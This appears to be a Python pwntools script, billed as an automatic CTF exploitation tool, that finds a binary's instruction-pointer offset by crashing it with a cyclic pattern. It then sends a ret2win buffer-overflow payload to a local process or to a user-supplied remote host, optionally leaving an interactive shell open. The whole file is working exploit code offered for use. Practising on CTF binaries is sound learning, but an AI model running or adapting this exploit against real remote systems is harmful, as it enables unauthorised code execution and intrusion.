#!/usr/bin/python3

from pwn import *
import os
import sys
import subprocess
import argparse
from termcolor import colored

context.log_level = "error"


## BANNER ##

def print_banner(title=""):
    print(colored ("""
    ____                 ________  __________            __
   / __ \_      ______  / ____/ /_/ __/_  __/___  ____  / /
  / /_/ / | /| / / __ \/ /   / __/ /_  / / / __ \/ __ \/ / 
 / ____/| |/ |/ / / / / /___/ /_/ __/ / / / /_/ / /_/ / /  
/_/     |__/|__/_/ /_/\____/\__/_/   /_/  \____/\____/_/   
                                                           

                By: DiegoAltF4 and Dbd4
""",'red'))
    total_len = 62
    if title:
        padding = total_len - len(title) - 4
        print("== {} {}\n".format(title, "=" * padding))
    else:
        print("{}\n".format("=" * total_len))



## MAIN PROGRAM ## 

if __name__ == "__main__":

    print_banner()

    # Arguments of the tool
    parser = argparse.ArgumentParser(description="Auto PWN tool for CTF")
    parser.add_argument('-vv', action="store_true", dest="moreVerbose", required=False, help="Max Verbose (debug)")
    parser.add_argument('-v', action="store_true", dest="verbose", required=False, help="Verbose (info)")
    parser.add_argument('-g', action="store_true", dest="gdbDebug", required=False, help="Attach GDB")
    parser.add_argument('-f', action="store", dest="file", required=True, help="File to PWN")
    parser.add_argument('-t', action="store", dest="target", required=True, help="Target Function")
    parser.add_argument('--offset', action="store_true", dest="offset", required=False, help="Print offset Instruction Pointer")
    parser.add_argument('--shell', action="store_true", dest="shell", required=False, help="Stay interactive")
    parser.add_argument('--remote', action="store_true", dest="remote", required=False, help="Exploit remote server")

    # Basic variables and context
    results = parser.parse_args()
    file = context.binary = results.file
    target = results.target
    elf = ELF(file)

    assert target in elf.symbols
    target = elf.symbols.get(target) # Get address of target function

    # Verbosity
    if (results.verbose):
        context.log_level = "info"
    if (results.moreVerbose):
        context.log_level = "debug"

    # Create cyclic pattern and crash the program using it
    payload = cyclic(1000)

    io = process(file)
    io.sendline(payload)
    io.wait()

    # Get core dump and analyse it to get the offset of the instruction pointer
    core = io.corefile
    io.close()

    if elf.elfclass==32:
        assert pack(core.eip) in payload
        offset=cyclic_find(core.eip)                # Offset for 32 bit executables
    else:
        assert core.read(core.rsp,4) in payload     
        offset=cyclic_find(core.read(core.rsp,4))   # Offset for 64 bit executables 

    if results.offset:
        print("\n[*] Offset: {}\n".format(offset))

    rop=ROP(file)
    ret=rop.ret.address                             # Bypass movaps in system 

    # PAYLOAD
    payload = flat({
        offset: [
            ret,
            target
        ]
    })

    # Remote or local explotation
    if results.remote:
        ip = input("IP/DOMAIN: ").strip()
        port = input("PORT: ")
        io = remote(ip,port)
    else:
        io = process(file)

    if results.gdbDebug:
        gdb.attach(io)

    # Send payload
    io.send(payload)
    io.sendline(b"\n")

    # Get the flag or a shell
    if results.shell:
        io.interactive()
    else:   
        print("\n[*] Possible flag:")
        print(colored ("\t{}\n".format(io.recvall()), "green"))

    # Remove the generated corefiles and close the conection
    os.remove(core.file.name)
    io.wait()
    if not results.remote:
        os.remove(io.corefile.file.name)
    io.close()